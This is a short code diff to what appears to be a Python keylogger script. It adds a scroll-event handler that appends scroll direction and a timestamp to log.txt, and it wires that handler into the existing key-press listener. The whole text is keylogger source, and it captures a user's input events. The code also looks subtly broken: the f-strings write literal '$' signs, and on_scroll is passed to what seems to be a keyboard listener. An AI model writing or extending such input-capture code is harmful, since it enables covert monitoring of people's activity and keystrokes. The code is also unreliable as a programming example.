@@ -43,9 +43,22 @@ def keylogreleased(key):
         # Stop listener
         return False
 
+def keylogscrolled(x, y, dx, dy):
+    scrolled = ""
+
+    with open("log.txt", "a") as f:
+        current_time = time()
+
+        if dy  < 0:
+            scrolled = "Down"
+
+        else:
+            scrolled = "Up"
+
+        f.write(f"Scrolled ${scrolled} at ${current_time}")
 
 
 
 # Collect all event until released
-with Listener(on_press = keylogpressed, on_release=keylogreleased) as listener:   
+with Listener(on_press = keylogpressed, on_release=keylogreleased,on_scroll=keylogscrolled) as listener:   
     listener.join()
